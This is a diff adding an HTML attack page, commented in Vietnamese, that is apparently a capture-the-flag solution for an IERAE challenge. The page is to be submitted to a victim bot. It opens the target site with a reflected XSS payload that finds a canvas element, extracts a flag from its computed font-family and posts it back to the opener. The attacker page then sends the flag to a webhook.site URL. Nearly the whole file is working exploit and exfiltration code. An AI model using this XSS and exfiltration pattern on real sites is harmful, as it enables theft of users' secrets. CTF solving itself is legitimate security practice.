@@ -1,0 +1,42 @@
+<!-- attacker.html - Nộp URL này cho bot -->
+<script>
+(async () => {
+  // Lấy APP_URL từ server cho tiện
+  const APP_URL = await (await fetch("/app-url")).text();
+
+  // Lắng nghe flag trả về
+  window.addEventListener("message", e => {
+    if (/^IERAE\{/.test(e.data)) {
+      // Gửi flag về webhook của bạn
+      fetch("https://webhook.site/YOUR_UNIQUE_ID?flag=" + encodeURIComponent(e.data));
+    }
+  });
+
+  // Đây là toàn bộ payload "Điệp viên"
+  const payload = `
+    try {
+      const findCanvas = (node) => {
+        if (node.nodeName === "CANVAS") return node;
+        for (const child of node.childNodes || []) {
+          const result = findCanvas(child);
+          if (result) return result;
+        }
+        return null;
+      };
+
+      const canvas = findCanvas(document.childNodes[0]);
+      const styles = getComputedStyle(canvas);
+      const flag = styles.fontFamily.match(/IERAE\\{[^}]+\\}/)[0];
+
+      // Gửi flag về cho trang cha
+      window.opener.postMessage(flag, "*");
+    } catch (e) {
+      // Có thể gửi lỗi về để debug nếu cần
+      // window.opener.postMessage("ERROR: " + e.message, "*");
+    }
+  `;
+
+  // Mở trang mục tiêu và tiêm payload
+  window.open(APP_URL + "/?xss=" + encodeURIComponent(payload));
+})();
+</script>
